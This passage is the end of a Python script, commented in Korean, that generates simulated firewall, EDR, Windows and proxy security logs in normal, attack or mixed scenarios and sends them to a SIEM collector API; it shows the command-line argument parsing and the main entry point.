            print(f"Total Bytes Sent: {stats['total_bytes']:,} bytes")
        print("=" * 60)


def parse_args() -> argparse.Namespace:
    """명령줄 인수 파싱"""
    parser = argparse.ArgumentParser(
        description="SIEM Log Generator - Collector HTTP API로 시뮬레이션된 보안 로그 전송",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # 기본 실행 (mixed 시나리오, 모든 자산, 5 logs/sec, 60초)
  python log_generator.py

  # 공격 시나리오만 실행
  python log_generator.py --scenario attack --rate 10 --duration 120

  # 특정 자산만 지정
  python log_generator.py --asset paloalto,crowdstrike

  # 높은 속도로 실행
  python log_generator.py --rate 100 --duration 300

  # Dry-run: 백엔드 없이 stdout으로 로그 확인 (HTTP 전송 없음)
  python log_generator.py --dry-run

  # Dry-run + 공격 시나리오 + verbose 상세 출력
  python log_generator.py --dry-run --verbose --scenario attack --rate 2 --duration 10

  # Dry-run + 특정 자산만 출력
  python log_generator.py --dry-run --asset windows --scenario attack

Assets:
  paloalto    - Palo Alto PA-5260 방화벽
  crowdstrike - CrowdStrike Falcon EDR
  windows     - Windows Server 2022 보안 이벤트
  zscaler     - Zscaler Cloud Proxy
        """
    )

    parser.add_argument(
        "--url",
        type=str,
        default=DEFAULT_COLLECTOR_URL,
        help=f"Collector API URL (default: {DEFAULT_COLLECTOR_URL})"
    )

    parser.add_argument(
        "--rate",
        type=int,
        default=5,
        help="초당 로그 생성 수 (default: 5)"
    )

    parser.add_argument(
        "--duration",
        type=int,
        default=60,
        help="실행 시간(초) (default: 60)"
    )

    parser.add_argument(
        "--scenario",
        type=str,
        choices=["normal", "attack", "mixed"],
        default="mixed",
        help="시나리오 유형: normal(정상만), attack(공격만), mixed(혼합) (default: mixed)"
    )

    parser.add_argument(
        "--asset",
        type=str,
        default="all",
        help="자산 지정: all 또는 쉼표로 구분된 목록 (paloalto,crowdstrike,windows,zscaler)"
    )

    parser.add_argument(
        "--dry-run",
        action="store_true",
        default=False,
        help=(
            "HTTP 전송 없이 생성된 로그를 stdout에 pretty-printed JSON으로 출력. "
            "백엔드 서비스 없이 로그 형식을 테스트할 때 사용 (default: False)"
        )
    )

    parser.add_argument(
        "--verbose",
        action="store_true",
        default=False,
        help=(
            "각 로그의 metadata 필드와 raw 로그를 추가로 출력. "
            "--dry-run과 함께 사용할 때 가장 유용 (default: False)"
        )
    )

    return parser.parse_args()


def main() -> int:
    """메인 함수"""
    args = parse_args()

    # 자산 목록 파싱 (Parse asset list)
    if args.asset.lower() == "all":
        assets = list(ASSETS.keys())
    else:
        assets = [a.strip().lower() for a in args.asset.split(",")]
        # 유효성 검사 (Validation)
        invalid = [a for a in assets if a not in ASSETS]
        if invalid:
            print(f"[ERROR] Invalid assets: {', '.join(invalid)}")
            print(f"Valid assets: {', '.join(ASSETS.keys())}")
            return 1

    # 실행 (Run)
    runner = LogGeneratorRunner(
        collector_url=args.url,
        rate=args.rate,
        duration=args.duration,
        scenario=args.scenario,
        assets=assets,
        dry_run=args.dry_run,
        verbose=args.verbose
    )

    runner.run()
    return 0


if __name__ == "__main__":
    sys.exit(main())
